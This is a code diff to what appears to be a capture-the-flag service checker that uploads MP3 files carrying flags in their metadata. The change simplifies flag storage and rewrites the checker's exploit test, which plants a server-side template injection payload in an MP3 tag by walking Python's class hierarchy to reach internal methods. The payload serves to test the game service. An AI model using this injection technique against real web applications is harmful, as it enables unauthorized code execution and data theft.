@@ -21,37 +21,12 @@ import utils
 import faker
 import logging
 import eyed3
-import queue
 import string
 import random
-import threading
 
 FAKER = faker.Faker(faker.config.AVAILABLE_LOCALES)
 checker = Enochecker("t3chn0r4d10", 8001)
 app = lambda: checker.app
-
-# Queue of currently valid flags
-shared_queue = queue.Queue()
-queue_lock = threading.Lock()
-
-
-# Function pops all flags that became invalid
-async def process_queue(queue, x):
-    with queue_lock:
-        while not queue.empty():
-            current = queue.queue[0]
-            if x - current[0] > 10:
-                print(f"Removing {current} as the round difference is greater than 10.")
-                queue.get()
-            else:
-                break
-
-
-# Join all valid flags to one string
-async def join_queue_elements(queue):
-    with queue_lock:
-        joined_string = ",".join([element[1] for element in queue.queue])
-        return joined_string
 
 
 def setup_logger(log_file):
@@ -105,12 +80,7 @@ async def putflag_test(
     # Try to upload mp3 to page
     with open(filename, "rb") as file:
         audio = eyed3.load(filename)
-        # Pop all flags that aren't valid anymore
-        await process_queue(shared_queue, task.current_round_id)
-        with queue_lock:
-            # Append current flag
-            shared_queue.put((task.current_round_id, task.flag))
-        flag_string = await join_queue_elements(shared_queue)
+        flag_string = task.flag
         logger.info("SET FLAG TEXT " + flag_string)
         flag = await utils.encode_to_base64(flag_string, logger)
         audio.tag.comments.set("FLAG" + flag + "FLAGEND")
@@ -173,9 +143,9 @@ async def exploit_test(
     await mp3_helper.create_modify_mp3(
         exploit_file,
         "Evil",
-        "{{ [].__class__.__mro__[1].__subclasses__()[-39].get_details(html_con, "
-        # + filename.replace(".mp3", "+")
-        + None + ") }}",
+        "{{ [].__class__.__mro__[1].__subclasses__()[-39].get_mp3_comments(html_con, +"
+        + filename.replace(".mp3", "+")
+        + ") }}",
         "Techno",
     )
     # Evil account credentials
